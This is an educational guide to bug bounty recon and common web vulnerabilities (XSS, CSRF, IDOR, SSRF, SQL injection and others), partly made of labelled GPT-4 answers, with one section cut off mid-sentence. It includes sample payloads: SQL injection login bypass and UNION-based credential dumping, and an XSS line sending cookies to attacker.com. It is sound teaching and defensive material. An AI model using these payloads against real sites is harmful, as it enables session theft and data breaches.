Beginner's Guide to Bug Bounties: Recon and Common Vulnerabilities
------------------------------------------------------------------

### Recon

Reconnaissance, or "recon," is the process of gathering information about a target system before attempting to attack it. This can involve using various tools and techniques to identify potential vulnerabilities and entry points.

### Common Vulnerabilities

#### 1\. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. These scripts can steal user data, manipulate web content, or redirect users to malicious websites.

Example of an XSS payload:

```xml
<script>alert('XSS');</script>
```

To find XSS vulnerabilities during an audit, look for input fields, URL parameters, and other areas where user input is accepted and rendered back to the user without proper sanitization. To prevent XSS attacks, always sanitize and validate user input, use secure coding practices, and implement Content Security Policy (CSP) headers. [openbugbounty.org](https://www.openbugbounty.org/blog/tag/cross-site-scripting-xss/)

#### 2\. Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a vulnerability that allows an attacker to force a user to perform actions on a website without their consent. This can lead to unauthorized actions, such as changing the user's email address or password.

Example of a CSRF exploit:

```html
<img src="https://example.com/changeEmail?newEmail=attacker@email.com" width="0" height="0" />
```

To find CSRF vulnerabilities, look for state-changing requests that do not have proper anti-CSRF tokens or other protections in place. To prevent CSRF attacks, use anti-CSRF tokens, validate and sanitize user input, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/csrf)

#### 3\. Insecure Direct Object References (IDOR)

Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to access objects directly, without proper access controls. This can lead to unauthorized access to sensitive data or functionality.

Example of an IDOR vulnerability:

```bash
https://example.com/customerAccount?customer_number=12345
```

To find IDOR vulnerabilities, look for URL parameters, input fields, or other areas where user input is used to access resources directly. To prevent IDOR attacks, implement proper access controls, validate and sanitize user input, and avoid exposing direct references to internal objects. [portswigger.net](https://portswigger.net/web-security/access-control/idor)

#### 4\. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server-side application send requests to arbitrary locations, potentially accessing sensitive data or internal systems.

Example of an SSRF exploit:

```bash
https://example.com/stockAPI?url=https://192.168.0.68/admin
```

To find SSRF vulnerabilities, look for areas where user-supplied URLs or other inputs are used to make server-side requests. To prevent SSRF attacks, validate and sanitize user input, use allowlists for permitted URLs, and implement proper network segmentation. [portswigger.net](https://portswigger.net/web-security/ssrf)

#### 5\. SQL Injection

SQL Injection is a vulnerability that allows an attacker to inject malicious SQL code into a query, potentially manipulating the database and accessing sensitive data.

Example of an SQL Injection payload:

```vbnet
' OR 1=1 --
```

To find SQL Injection vulnerabilities, look for input fields, URL parameters, or other areas where user input is used in SQL queries. To prevent SQL Injection attacks, use parameterized queries or prepared statements, validate and sanitize user input, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/sql-injection)

#### 6\. Cross-Origin Resource Sharing (CORS) Vulnerabilities

CORS vulnerabilities occur when an application allows unauthorized domains to access its resources, potentially leading to data leakage or manipulation.

Example of a CORS vulnerability:

```makefile
Access-Control-Allow-Origin: *
```

To find CORS vulnerabilities, look for misconfigured CORS headers in server responses. To prevent CORS vulnerabilities, configure CORS headers properly, use allowlists for permitted domains, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/cors)

#### 7\. Session Hijacking

Session Hijacking is an attack where an attacker steals a user's session identifier, allowing them to impersonate the user and perform actions on their behalf.

Example of a Session Hijacking exploit:

```vbnet
Stealing a user's session cookie and using it to access their account.
```

To find Session Hijacking vulnerabilities, look for insecure handling of session identifiers, such as transmitting them over insecure channels or storing them in insecure locations. To prevent Session Hijacking, use secure session management practices,

___
**Gpt-4 answer:**
#### 8\. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

LFI and RFI are vulnerabilities that allow an attacker to include local or remote files in a web application, potentially leading to unauthorized access to sensitive data or execution of malicious code. LFI involves including a file stored on the target server, while RFI involves including a file from an external source [spanning.com](https://spanning.com/blog/file-inclusion-vulnerabilities-lfi-rfi-web-based-application-security-part-9/).

To find LFI and RFI vulnerabilities, look for areas where user input is used to include files, such as URL parameters or input fields, without proper validation. To prevent LFI and RFI attacks, sanitize and validate user input, disable remote inclusion features in PHP configuration, and whitelist accepted filenames [secf00tprint.github.io](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en).

#### 9\. HTTP Parameter Pollution (HPP)

HTTP Parameter Pollution (HPP) is a vulnerability that allows an attacker to manipulate or inject additional HTTP parameters into a request, potentially leading to unauthorized actions or data manipulation.

To find HPP vulnerabilities, look for areas where multiple HTTP parameters with the same name are accepted without proper validation. To prevent HPP attacks, sanitize and validate user input, implement server-side input validation, and use secure coding practices.

#### 10\. Command Injection

Command Injection is a vulnerability that allows an attacker to execute arbitrary system commands on the server by injecting malicious input into a vulnerable application.

To find Command Injection vulnerabilities, look for areas where user input is used to construct and execute system commands without proper validation. To prevent Command Injection attacks, sanitize and validate user input, use parameterized APIs, and implement proper access controls.

#### 11\. Open Redirect

Open Redirect is a vulnerability that allows an attacker to redirect users to arbitrary domains by manipulating a vulnerable application's URL parameters or input fields.

To find Open Redirect vulnerabilities, look for areas where user input is used to construct redirect URLs without proper validation. To prevent Open Redirect attacks, sanitize and validate user input, use allowlists for permitted domains, and implement proper access controls.

#### 12\. XML External Entity (XXE)

XML External Entity (XXE) is a vulnerability that allows an attacker to exploit external entities in XML documents, potentially leading to unauthorized access to sensitive data or remote code execution.

To find XXE vulnerabilities, look for areas where XML documents are parsed without proper validation or security configurations. To prevent XXE attacks, disable external entities in XML parsers, validate and sanitize user input, and use secure coding practices.

#### 13\. File Upload Vulnerabilities

File Upload vulnerabilities occur when an application allows unauthorized or unvalidated file uploads, potentially leading to unauthorized access to sensitive data, remote code execution, or other attacks.

To find File Upload vulnerabilities, look for areas where file uploads are accepted without proper validation, file type restrictions, or access controls. To prevent File Upload vulnerabilities, sanitize and validate user input, implement secure file upload practices, and use proper access controls.

#### 14\. Server-Side XSS

Server-Side XSS is a variant of Cross-Site Scripting (XSS) where the malicious payload is stored and executed on the server-side, rather than being reflected in the client-side application.

To find Server-Side XSS vulnerabilities, look for areas where user input is stored on the server and later rendered back to users without proper sanitization. To prevent Server-Side XSS attacks, sanitize and validate user input, use secure coding practices, and implement Content Security Policy (CSP) headers.

**Gpt-4 answer:**
### Detailed Examples and Analysis of Common Vulnerabilities

#### 1\. Cross-Site Scripting (XSS)

**Example 1: Reflected XSS**

A search functionality in a website takes a user's search query as input and directly reflects it back in the search results page. An attacker crafts a URL containing a malicious script as the search parameter:

```xml
https://example.com/search?q=<script>alert('XSS');</script>
```

When a victim clicks the crafted URL, the malicious script is executed, causing an alert box to pop up. This example demonstrates a simple reflected XSS attack, where the malicious payload is executed immediately upon visiting the crafted URL.

**Example 2: Stored XSS**

A web application allows users to post comments on a blog post. The application does not properly sanitize the user input, allowing an attacker to post a comment containing a malicious script:

```xml
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
```

When other users view the blog post, the malicious script is executed, sending their session cookies to the attacker's server. This example demonstrates a stored XSS attack, where the malicious payload is stored on the server and executed for multiple users.

To learn more about real-world XSS vulnerabilities, you can refer to the following resources:

*   [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
*   [PortSwigger's XSS Labs](https://portswigger.net/web-security/cross-site-scripting)

#### 2\. SQL Injection

**Example 1: Authentication Bypass**

A web application's login functionality uses the following SQL query to authenticate users:

```sql
SELECT * FROM users WHERE username='INPUT_USERNAME' AND password='INPUT_PASSWORD';
```

An attacker enters the following input as the username:

```vbnet
' OR 1=1 --
```

The resulting SQL query becomes:

```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='INPUT_PASSWORD';
```

Since `1=1` is always true, the authentication check is bypassed, and the attacker gains unauthorized access to the application.

**Example 2: Data Exfiltration**

A web application displays a user's profile based on a user\_id parameter in the URL:

```bash
https://example.com/profile?user_id=1
```

The application uses the following SQL query to fetch user information:

```sql
SELECT * FROM users WHERE user_id=INPUT_USER_ID;
```

An attacker manipulates the URL parameter with a SQL injection payload:

```sql
https://example.com/profile?user_id=1 UNION SELECT 1,username,password,email FROM users--
```

The resulting SQL query becomes:

```sql
SELECT * FROM users WHERE user_id=1 UNION SELECT 1,username,password,email FROM users--;
```

The attacker retrieves all users' information, including usernames, passwords, and email addresses, leading to a data breach.

To learn more about real-world SQL injection vulnerabilities, you can refer to the following resources:

*   [OWASP SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
*   [PortSwigger's SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
